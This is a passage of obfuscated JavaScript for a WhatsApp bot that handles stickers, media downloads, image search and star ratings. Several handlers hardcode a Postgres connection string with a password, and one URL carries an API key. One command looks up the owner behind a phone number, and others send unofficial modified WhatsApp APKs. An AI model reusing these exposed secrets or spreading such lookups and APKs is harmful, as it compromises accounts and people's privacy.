                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : .attp hello bro");
            }
            const {
              Sticker: _0x10c6d9,
              createSticker: _0x49b2b4,
              StickerTypes: _0x1f4cd9
            } = require("wa-sticker-formatter");
            let _0x2726c1 = new _0x10c6d9("https://api.lolhuman.xyz/api/ttp?apikey=2e0da1f78d1721134b21816d&text=" + _0x1b3106, {
              'pack': _0x4f7ded,
              'author': '',
              'type': _0x1b3106.includes('--crop' || '-c') ? _0x1f4cd9.CROPPED : _0x1f4cd9.FULL,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x4b,
              'background': "transparent"
            });
            const _0x5b70a0 = await _0x2726c1.toBuffer();
            return _0x1303d3.sendMessage(_0x2ab1fb, {
              'sticker': _0x5b70a0
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "sticker":
        case 's':
        case 'stic':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🔮',
                'key': _0x49cb26.key
              }
            });
            const _0x4ffdf6 = sms(_0x1303d3, _0x49cb26);
            const {
              Sticker: _0x1abcfd,
              createSticker: _0xc26ae9,
              StickerTypes: _0x21aa0f
            } = require('wa-sticker-formatter');
            if (_0x1cb981) {
              var _0x1c765f = getRandom('');
              let _0x194473 = (await _0x4ffdf6.quoted.download(_0x1c765f)) || (await _0x4ffdf6.download(_0x1c765f));
              let _0x37d003 = new _0x1abcfd(_0x194473, {
                'pack': _0x4f7ded,
                'author': '',
                'type': _0x1b3106.includes('--crop' || '-c') ? _0x21aa0f.CROPPED : _0x21aa0f.FULL,
                'categories': ['🤩', '🎉'],
                'id': "12345",
                'quality': 0x4b,
                'background': "transparent"
              });
              const _0x5f02fe = await _0x37d003.toBuffer();
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'sticker': _0x5f02fe
              }, {
                'quoted': _0x49cb26
              });
            } else {
              _0x33e5d9("*Please reply to any image.*");
            }
          }
          break;
        case 'tourl1':
          {
            _0x33e5d9('wait');
            const {
              uploaderAPI: _0x4241f5
            } = require('./lib/uploaderr');
            const _0xe76cb6 = sms(_0x1303d3, _0x49cb26);
            var _0x1c765f = getRandom('');
            let _0x2191d5 = (await _0xe76cb6.quoted.download(_0x1c765f)) || (await _0xe76cb6.download(_0x1c765f));
            let {
              UploadFileUgu: _0x58d43f,
              webp2mp4File: _0x4d5c99,
              TelegraPh: _0x405414
            } = require('./lib/uploader');
            let _0x38d85b = await _0x405414(_0x2191d5);
            _0x33e5d9(util.format(_0x38d85b));
          }
          break;
        case 's1':
          {
            const _0x4a45fb = new dbM({
              'db': 'postgres://astrmldt_user:8FyEDVGSNSRZ7E1VG9MGb9WvaGedJgUs@dpg-celtrp9a6gdkdn33fbhg-a.frankfurt-postgres.render.com/astrmldt',
              'key': "vihanga_db"
            });
            const _0x2e98c4 = await _0x4a45fb.get("star_1");
            let _0x669b56 = _0x2e98c4 + 'a';
            _0x4a45fb.insert('star_1', _0x669b56);
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "*Thank's For The 1 Stars* 😍"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 's2':
          {
            const _0x421d73 = new dbM({
              'db': 'postgres://astrmldt_user:8FyEDVGSNSRZ7E1VG9MGb9WvaGedJgUs@dpg-celtrp9a6gdkdn33fbhg-a.frankfurt-postgres.render.com/astrmldt',
              'key': "vihanga_db"
            });
            const _0x25f727 = await _0x421d73.get("star_2");
            let _0x432c42 = _0x25f727 + 'a';
            _0x421d73.insert('star_2', _0x432c42);
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "*Thank's For The 2 Stars* 😍"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 's3':
          {
            const _0x4d9bb3 = new dbM({
              'db': "postgres://astrmldt_user:8FyEDVGSNSRZ7E1VG9MGb9WvaGedJgUs@dpg-celtrp9a6gdkdn33fbhg-a.frankfurt-postgres.render.com/astrmldt",
              'key': 'vihanga_db'
            });
            const _0xf3cc62 = await _0x4d9bb3.get("star_3");
            let _0x2d3947 = _0xf3cc62 + 'a';
            _0x4d9bb3.insert("star_3", _0x2d3947);
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "*Thank's For The 3 Stars* 😍"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 's4':
          {
            const _0x1933d0 = new dbM({
              'db': "postgres://astrmldt_user:8FyEDVGSNSRZ7E1VG9MGb9WvaGedJgUs@dpg-celtrp9a6gdkdn33fbhg-a.frankfurt-postgres.render.com/astrmldt",
              'key': "vihanga_db"
            });
            const _0x4fbf42 = await _0x1933d0.get('star_4');
            let _0x5f145a = _0x4fbf42 + 'a';
            _0x1933d0.insert("star_4", _0x5f145a);
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "*Thank's For The 4 Stars 😍*"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 's5':
          {
            const _0x4b5025 = new dbM({
              'db': "postgres://astrmldt_user:8FyEDVGSNSRZ7E1VG9MGb9WvaGedJgUs@dpg-celtrp9a6gdkdn33fbhg-a.frankfurt-postgres.render.com/astrmldt",
              'key': "vihanga_db"
            });
            const _0x44d8bc = await _0x4b5025.get('star_5');
            let _0x1b85ae = _0x44d8bc + 'a';
            _0x4b5025.insert("star_5", _0x1b85ae);
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "*Thank's For The 5 Stars 🌛*"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'star':
        case "stars":
        case 'rate':
        case "rates":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '✨',
                'key': _0x49cb26.key
              }
            });
            const _0x5a8486 = new dbM({
              'db': 'postgres://astrmldt_user:8FyEDVGSNSRZ7E1VG9MGb9WvaGedJgUs@dpg-celtrp9a6gdkdn33fbhg-a.frankfurt-postgres.render.com/astrmldt',
              'key': "vihanga_db"
            });
            let _0x1477d9 = await _0x5a8486.get("star_1");
            let _0xd23603 = await _0x5a8486.get("star_2");
            let _0x58588e = await _0x5a8486.get("star_3");
            let _0x3375ea = await _0x5a8486.get("star_4");
            let _0x259912 = await _0x5a8486.get("star_5");
            const _0x2b5787 = "⭐ *ʀᴀᴛᴇ ᴜꜱ* ⭐\n*★ stars : " + _0x1477d9.length + "*\n*★★ stars : " + _0xd23603.length + "*\n*★★★ stars : " + _0x58588e.length + "*\n*★★★★ stars : " + _0x3375ea.length + "*\n*★★★★★ stars : " + _0x259912.length + '*';
            const _0x6c0434 = [{
              'title': "ʀᴀᴛᴇ ᴜꜱ",
              'rows': [{
                'title': "5 Stars",
                'rowId': ".s5 "
              }, {
                'title': "4 Stars",
                'rowId': ".s4 "
              }, {
                'title': "3 Stars",
                'rowId': ".s3 "
              }, {
                'title': "2 Stars",
                'rowId': ".s2 "
              }, {
                'title': "1 Stars",
                'rowId': ".s1 "
              }]
            }];
            const _0xef2b20 = {
              'text': _0x2b5787,
              'footer': config.FOOTER,
              'title': '',
              'buttonText': "⭐ ʀᴀᴛᴇ ᴜꜱ ⭐",
              'sections': _0x6c0434
            };
            await _0x1303d3.sendMessage(_0x2ab1fb, _0xef2b20, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'ytmp4':
          try {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': "📽️",
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106.includes("https")) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "*Need Url*"
              }, {
                'quoted': _0x49cb26
              });
            }
            let _0x47c33b = await fetchJson('https://youtubeapisdownloader.vercel.app/youtube/downloader/video?url=' + _0x1b3106 + '&responsetype=JSON');
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': '*' + _0x47c33b.result.title + '*'
            }, {
              'quoted': _0x49cb26
            });
            if (_0x1b3106.includes("short")) {
              await _0x1303d3.sendMessage(_0x2ab1fb, {
                'video': {
                  'url': _0x47c33b.download
                },
                'caption': ''
              }, {
                'quoted': _0x49cb26
              });
            }
            let _0x2b0b12 = _0x47c33b.result.downloads.tubemp3_biz[0x1].size.replace('MB', '');
            if (_0x2b0b12 >= 0x3c) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "❌ File size bigger than 50mb."
              }, {
                'quoted': _0x49cb26
              });
            }
            if (_0x47c33b.result.downloads.tubemp3_biz[0x1].size.includes('GB')) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "❌ File size bigger than 50mb."
              }, {
                'quoted': _0x49cb26
              });
            }
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'video': {
                'url': _0x47c33b.result.downloads.tubemp3_biz[0x1].url
              },
              'caption': ''
            }, {
              'quoted': _0x49cb26
            });
          } catch (_0x538b7f) {
            console.log(_0x538b7f);
          }
          break;
        case "ytmp3":
          try {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🎵',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106.includes("https")) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "*Need Url*"
              }, {
                'quoted': _0x49cb26
              });
            }
            let _0x29e2ba = await yt1s(_0x1b3106, "360p");
            if (_0x1b3106.includes("short")) {
              let _0x3214de = {
                'audio': {
                  'url': _0x29e2ba.media.mp3.link
                },
                'mimetype': "audio/mpeg",
                'fileName': _0x29e2ba.info.title + ".mp3",
                'headerType': 0x4,
                'contextInfo': {
                  'externalAdReply': {
                    'title': _0x29e2ba.info.title,
                    'body': _0x4f7ded,
                    'renderLargerThumbnail': true,
                    'thumbnailUrl': _0x29e2ba.info.thumbnail,
                    'mediaUrl': _0x1b3106,
                    'mediaType': 0x1,
                    'thumbnail': await getBuffer(_0x29e2ba.info.thumbnail),
                    'sourceUrl': _0x1b3106
                  }
                }
              };
              await _0x1303d3.sendMessage(_0x2ab1fb, _0x3214de, {
                'quoted': _0x49cb26
              });
            }
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': '*' + _0x29e2ba.info.title + "* _[" + _0x29e2ba.media.mp3.size + ']_'
            }, {
              'quoted': _0x49cb26
            });
            let _0x34f84a = _0x29e2ba.media.mp3.size.replace('MB', '');
            if (_0x34f84a >= 0x46) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "❌ File size bigger than 70mb."
              }, {
                'quoted': _0x49cb26
              });
            }
            if (_0x29e2ba.media.mp3.size.includes('GB')) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "❌ File size bigger than 70mb."
              }, {
                'quoted': _0x49cb26
              });
            }
            let _0x4c9ff6 = {
              'audio': {
                'url': _0x29e2ba.media.mp3.link
              },
              'mimetype': "audio/mpeg",
              'fileName': _0x29e2ba.info.title + '.mp3',
              'headerType': 0x4,
              'contextInfo': {
                'externalAdReply': {
                  'title': _0x29e2ba.info.title,
                  'body': _0x4f7ded,
                  'renderLargerThumbnail': true,
                  'thumbnailUrl': _0x29e2ba.info.thumbnail,
                  'mediaUrl': _0x1b3106,
                  'mediaType': 0x1,
                  'thumbnail': await getBuffer(_0x29e2ba.info.thumbnail),
                  'sourceUrl': _0x1b3106
                }
              }
            };
            await _0x1303d3.sendMessage(_0x2ab1fb, _0x4c9ff6, {
              'quoted': _0x49cb26
            });
          } catch (_0x44e38f) {
            console.log(_0x44e38f);
          }
          break;
        case "ytdoc":
          try {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🎵',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106.includes("https")) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "*Need Url*"
              }, {
                'quoted': _0x49cb26
              });
            }
            let _0xa5a9a1 = await yt1s(_0x1b3106, "360p");
            if (_0x1b3106.includes("short")) {
              await _0x1303d3.sendMessage(_0x2ab1fb, {
                'document': {
                  'url': _0xa5a9a1.media.mp3.link
                },
                'mimetype': "audio/mp4",
                'fileName': _0xa5a9a1.info.title + ".mp3",
                'caption': ''
              }, {
                'quoted': _0x49cb26
              });
            }
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': '*' + _0xa5a9a1.info.title + "* _[" + _0xa5a9a1.media.mp3.size + ']_'
            }, {
              'quoted': _0x49cb26
            });
            let _0x558c72 = _0xa5a9a1.media.mp3.size.replace('MB', '');
            if (_0x558c72 >= 0x46) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "❌ File size bigger than 70mb."
              }, {
                'quoted': _0x49cb26
              });
            }
            if (_0xa5a9a1.media.mp3.size.includes('GB')) {
              return _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "❌ File size bigger than 70mb."
              }, {
                'quoted': _0x49cb26
              });
            }
            let _0x1c2817 = {
              'document': {
                'url': _0xa5a9a1.media.mp3.link
              },
              'mimetype': "audio/mpeg",
              'fileName': _0xa5a9a1.info.title + ".mp3",
              'headerType': 0x4,
              'contextInfo': {
                'externalAdReply': {
                  'title': _0xa5a9a1.info.title,
                  'body': _0x4f7ded,
                  'renderLargerThumbnail': true,
                  'thumbnailUrl': _0xa5a9a1.info.thumbnail,
                  'mediaUrl': _0x1b3106,
                  'mediaType': 0x1,
                  'thumbnail': await getBuffer(_0xa5a9a1.info.thumbnail),
                  'sourceUrl': _0x1b3106
                }
              }
            };
            await _0x1303d3.sendMessage(_0x2ab1fb, _0x1c2817, {
              'quoted': _0x49cb26
            });
          } catch (_0x17964f) {
            console.log(_0x17964f);
          }
          break;
        case "play":
        case 'yt':
          try {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🔍',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : ." + _0x44ccdd + " lelena");
            }
            let _0x474850 = require('yt-search');
            let _0x67bd54 = await _0x474850(_0x1b3106);
            let _0x189759 = _0x67bd54.videos[0x0];
            const _0x49bafb = "*┌───[🖲️ DARK-NA ʏᴛ ᴅᴏᴡɴ 🖲️]*\n  \n*│📟 TITLE:* " + _0x189759.title + "\n  \n*│👀 VIEWS:* " + _0x189759.views + " \n  \n*│⏰ DURATION:* " + _0x189759.timestamp + "\n  \n*│🖇️ URL:* " + _0x189759.url + "\n  \n└───────────◉";
            let _0x57ed11 = [{
              'buttonId': ".ytmp4 " + _0x189759.url,
              'buttonText': {
                'displayText': "VIDEO"
              },
              'type': 0x1
            }, {
              'buttonId': ".ytmp3 " + _0x189759.url,
              'buttonText': {
                'displayText': 'AUDIO'
              },
              'type': 0x1
            }, {
              'buttonId': ".rate ",
              'buttonText': {
                'displayText': "🔰 Rate Us 🔰"
              },
              'type': 0x1
            }];
            let _0x2ee221 = {
              'image': {
                'url': _0x189759.thumbnail
              },
              'caption': _0x49bafb,
              'footer': "sᴇʟᴇᴄᴛ ꜰᴏʀᴍᴀᴛ:",
              'buttons': _0x57ed11,
              'headerType': 0x4
            };
            _0x1303d3.sendMessage(_0x2ab1fb, _0x2ee221, {
              'quoted': _0x49cb26
            });
          } catch (_0x32e27f) {
            _0x33e5d9("*Not Found !*");
          }
          break;
        case "song":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🎧',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : ." + _0x44ccdd + " lelena");
            }
            let _0x359c6 = require("yt-search");
            let _0x28d1b9 = await _0x359c6(_0x1b3106);
            let _0x5dd926 = _0x28d1b9.videos[0x0];
            const _0x1d157f = "*┌───[💖 DARK NA ꜱᴏɴɢ ᴅᴏᴡɴ 💖]*\n  \n*│💖 TITLE:* " + _0x5dd926.title + "\n  \n*│👀 VIEWS:* " + _0x5dd926.views + " \n  \n*│⏰ DURATION:* " + _0x5dd926.timestamp + "\n  \n*│🖇️ URL:* " + _0x5dd926.url + "\n  \n└───────────◉";
            let _0x20a2e0 = [{
              'buttonId': ".ytdoc " + _0x5dd926.url,
              'buttonText': {
                'displayText': "DOCUMENT"
              },
              'type': 0x1
            }, {
              'buttonId': ".ytmp3 " + _0x5dd926.url,
              'buttonText': {
                'displayText': "AUDIO"
              },
              'type': 0x1
            }, {
              'buttonId': ".rate ",
              'buttonText': {
                'displayText': "🔰 Rate Us 🔰"
              },
              'type': 0x1
            }];
            let _0x9d987d = {
              'image': {
                'url': _0x5dd926.thumbnail
              },
              'caption': _0x1d157f,
              'footer': "sᴇʟᴇᴄᴛ ꜰᴏʀᴍᴀᴛ:",
              'buttons': _0x20a2e0,
              'headerType': 0x4
            };
            _0x1303d3.sendMessage(_0x2ab1fb, _0x9d987d, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'video':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📽️',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : ." + _0x44ccdd + " lelena");
            }
            let _0x53bc21 = require("yt-search");
            let _0x291931 = await _0x53bc21(_0x1b3106);
            let _0x15f9f1 = _0x291931.videos[0x0];
            const _0x526d06 = "*┌───[📽️ DARK NA ᴠɪᴅ ᴅᴏᴡɴ 📽️]*\n  \n*│📟 TITLE:* " + _0x15f9f1.title + "\n  \n*│👀 VIEWS:* " + _0x15f9f1.views + " \n  \n*│⏰ DURATION:* " + _0x15f9f1.timestamp + "\n\n*│🖇️ URL:* " + _0x15f9f1.url + "\n  \n└───────────◉";
            let _0x234267 = [{
              'buttonId': ".ytmp4 " + _0x15f9f1.url,
              'buttonText': {
                'displayText': "📽️ DOWNLOAD 📽️"
              },
              'type': 0x1
            }, {
              'buttonId': ".rate ",
              'buttonText': {
                'displayText': "🔰 Rate Us 🔰"
              },
              'type': 0x1
            }];
            let _0x3e017f = {
              'image': {
                'url': _0x15f9f1.thumbnail
              },
              'caption': _0x526d06,
              'footer': "sᴇʟᴇᴄᴛ Qᴜᴀʟɪᴛʏ:",
              'buttons': _0x234267,
              'headerType': 0x4
            };
            _0x1303d3.sendMessage(_0x2ab1fb, _0x3e017f, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'true':
        case "truecaller":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📞',
                'key': _0x49cb26.key
              }
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📱',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Enter a Number to get Owner Info!");
            }
            let _0x39f4f8 = await fetchJson("https://inrl-web.vercel.app/api/truecaller?number=" + _0x1b3106);
            let _0x4dee88 = "\n*Name:* " + _0x39f4f8.name + "\n*Type:* " + _0x39f4f8.type + "\n*Country:* " + _0x39f4f8.country + "\n*Carrier:* " + _0x39f4f8.carrier + "\n*TimeZone:* " + _0x39f4f8.timeZone + "\n";
            _0x33e5d9(_0x4dee88);
          }
          break;
        case 'fb':
          try {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🧼',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : " + ('.' + _0x44ccdd) + " link");
            }
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🧣',
                'key': _0x49cb26.key
              }
            });
            const _0x34fbbb = await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': config.VIDEO_DOWN
            }, {
              'quoted': _0x49cb26
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'delete': _0x34fbbb.key
            });
            const _0x16ffad = await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': config.VIDEO_UP
            }, {
              'quoted': _0x49cb26
            });
            let _0xfdac7 = "https://api.akuari.my.id/downloader/fbdl?link=" + _0x1b3106;
            axios.get(_0xfdac7).then(({
              data: _0x222808
            }) => {
              _0x1303d3.sendMessage(_0x2ab1fb, {
                'video': {
                  'url': _0x222808.url.url
                },
                'caption': config.CAPTION
              }, {
                'quoted': _0x49cb26
              });
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'delete': _0x16ffad.key
            });
          } catch (_0x17a56b) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "NOT FOUND"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "tiktok":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🏷️',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : " + ('.' + _0x44ccdd) + " link");
            }
            if (!_0x1b3106.includes("tiktok")) {
              return _0x33e5d9("Link Invalid!!");
            }
            _0x33e5d9("*Please Wait...*");
            let _0x5b8ab8 = 'https://api.akuari.my.id/downloader/tiktoknowm?link=' + _0x1b3106;
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'video': {
                'url': _0x5b8ab8
              },
              'caption': config.CAPTION
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'ig':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🎀',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Example : " + ('.' + _0x44ccdd) + " link");
            }
            _0x33e5d9("*Please Wait...*");
            let _0x5e0fe5 = await _0x10312f(_0x1b3106);
            for (let _0x20165f = 0x0; _0x20165f < _0x5e0fe5.length; _0x20165f++) {
              await _0x1303d3.sendFileUrl(_0x2ab1fb, _0x5e0fe5[_0x20165f], "*Downloaded Media from instagram.*", _0x49cb26);
            }
          }
          break;
          break;
        case 'mediafire':
        case "mfire":
          try {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📁',
                'key': _0x49cb26.key
              }
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📁',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Give link");
            }
            const _0xdc246a = await mediafire(_0x1b3106);
            const _0x3d4f64 = await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': config.FILE_DOWN
            }, {
              'quoted': _0x49cb26
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'delete': _0x3d4f64.key
            });
            const _0x40beab = await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': config.FILE_UP
            }, {
              'quoted': _0x49cb26
            });
            const _0x5340c0 = _0x1303d3.sendMessage(_0x2ab1fb, {
              'document': {
                'url': _0xdc246a[0x0].link
              },
              'fileName': _0xdc246a[0x0].nama,
              'mimetype': _0xdc246a[0x0].mime
            }, {
              'quoted': _0x49cb26
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'delete': _0x40beab.key
            });
          } catch (_0x2bbe97) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "error\n\n" + _0x2bbe97
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'img':
          {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': "🖼️",
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Enter a search term to get Google Image!");
            }
            _0x33e5d9("*Plz Wait I'm Uploading 5 Images Of " + _0x1b3106 + '*');
            let _0x41a75c = require("g-i-s");
            _0x41a75c(_0x3d7650.join(" "), async (_0x28e614, _0x4c37f5) => {
              n = _0x4c37f5;
              img1 = n[0x0].url;
              img2 = n[0x1].url;
              img3 = n[0x2].url;
              img4 = n[0x3].url;
              img5 = n[0x4].url;
              _0x1303d3.sendMessage(_0x2ab1fb, {
                'image': {
                  'url': img1
                },
                'caption': ''
              }, {
                'quoted': _0x49cb26
              });
              _0x1303d3.sendMessage(_0x2ab1fb, {
                'image': {
                  'url': img2
                },
                'caption': ''
              }, {
                'quoted': _0x49cb26
              });
              _0x1303d3.sendMessage(_0x2ab1fb, {
                'image': {
                  'url': img3
                },
                'caption': ''
              }, {
                'quoted': _0x49cb26
              });
              _0x1303d3.sendMessage(_0x2ab1fb, {
                'image': {
                  'url': img4
                },
                'caption': ''
              }, {
                'quoted': _0x49cb26
              });
              _0x1303d3.sendMessage(_0x2ab1fb, {
                'image': {
                  'url': img5
                },
                'caption': ''
              }, {
                'quoted': _0x49cb26
              });
            });
          }
          break;
        case 'ss':
        case "ssweb":
        case 'sspc':
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📱',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106.includes('htt')) {
              return _0x33e5d9("_Need a url_");
            }
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🖼️',
                'key': _0x49cb26.key
              }
            });
            let _0x29317c = "https://saipulanuar.ga/api/download/ssweb?url=" + _0x1b3106;
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'image': {
                'url': _0x29317c
              },
              'caption': config.CAPTION
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "ss2":
        case "ssphone":
          {
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '📱',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106.includes("htt")) {
              return _0x33e5d9("_Need a url_");
            }
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': "🖼️",
                'key': _0x49cb26.key
              }
            });
            let _0x582879 = "https://saipulanuar.ga/api/download/ssweb2?url=" + _0x1b3106;
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'image': {
                'url': _0x582879
              },
              'caption': config.CAPTION
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "wamod":
          try {
            const _0x6eea2b = [];
            axios.get('https://fmmods.com/download-center/mega.php').then(_0x4fd5c9 => {
              const _0x351d6a = _0x34cd92.load(_0x4fd5c9.data);
              _0x351d6a("div.su-button-center").each((_0x2f8723, _0x356305) => {
                const _0x4d226f = _0x351d6a(_0x356305).find('a').attr("href");
                const _0x2e0ba3 = {
                  'links': _0x4d226f
                };
                _0x6eea2b.push(_0x2e0ba3);
              });
              const _0x371ee8 = [{
                'title': "Wa-mods",
                'rows': [{
                  'title': "Fouad Whatsapp [com.whatsapp]",
                  'rowId': ".downa " + _0x6eea2b[0x0].links
                }, {
                  'title': "Fm Whatsapp [com.fmwa]",
                  'rowId': ".downa1 " + _0x6eea2b[0x1].links
                }, {
                  'title': "Gb Whatsapp [com.gbwa]",
                  'rowId': ".downa2 " + _0x6eea2b[0x2].links
                }, {
                  'title': "Yo Whatsapp [com.yowa]",
                  'rowId': ".downa3 " + _0x6eea2b[0x3].links
                }]
              }];
              const _0x4e5c53 = {
                'text': '',
                'footer': config.FOOTER,
                'title': "*DARKNA-MD Wa-Mod Downloader*",
                'buttonText': 'Results',
                'sections': _0x371ee8
              };
              _0x1303d3.sendMessage(_0x2ab1fb, _0x4e5c53, {
                'quoted': _0x49cb26
              });
            });
          } catch (_0x5a021e) {
            _0x33e5d9("errrrrrrr " + _0x5a021e);
            console.log(_0x5a021e);
          }
          break;
        case "downa":
          try {
            _0x33e5d9('Downloading...');
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'document': {
                'url': _0x1b3106
              },
              'fileName': "Fouad Whatsapp [com.whatsapp].apk",
              'mimetype': "application/vnd.android.package-archive"
            }, {
              'quoted': _0x49cb26
            });
          } catch (_0x403ce6) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "error"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'downa1':
          try {
            _0x33e5d9("Downloading...");
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'document': {
                'url': _0x1b3106
              },
              'fileName': "Fm Whatsapp [com.fmwa].apk",
              'mimetype': 'application/vnd.android.package-archive'
            }, {
              'quoted': _0x49cb26
            });
          } catch (_0x2612a1) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': 'error'
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "downa2":
          try {
            _0x33e5d9("Downloading...");
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'document': {
                'url': _0x1b3106
              },
              'fileName': "Gb Whatsapp [com.gbwa].apk",
              'mimetype': "application/vnd.android.package-archive"
            }, {
              'quoted': _0x49cb26
            });
          } catch (_0x12749a) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': 'error'
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "downa3":
          try {
            _0x33e5d9("Downloading...");
            _0x1303d3.sendMessage(_0x2ab1fb, {
              'document': {
                'url': _0x1b3106
              },
              'fileName': "Yo Whatsapp [com.yowa].apk",
              'mimetype': "application/vnd.android.package-archive"
            }, {
              'quoted': _0x49cb26
            });
          } catch (_0x24e452) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "error"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "logo":
          try {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🤹‍♀️',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return await _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "Type a name"
              }, {
                'quoted': _0x49cb26
              });
            }
            let _0x596792 = _0x3d7650[0x1] ? _0x3d7650[0x1] : '.';
            let _0x1bb2b8 = _0x3d7650[0x0];
            const _0x8210c4 = [{
              'title': "Logo Results",
              'rows': [{
                'title': "Shadow",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/shadow?text=" + _0x1b3106
              }, {
                'title': "Cup",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/cup?text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/romantic?text=" + _0x1b3106
              }, {
                'title': 'Smoke',
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/smoke?text=" + _0x1b3106
              }, {
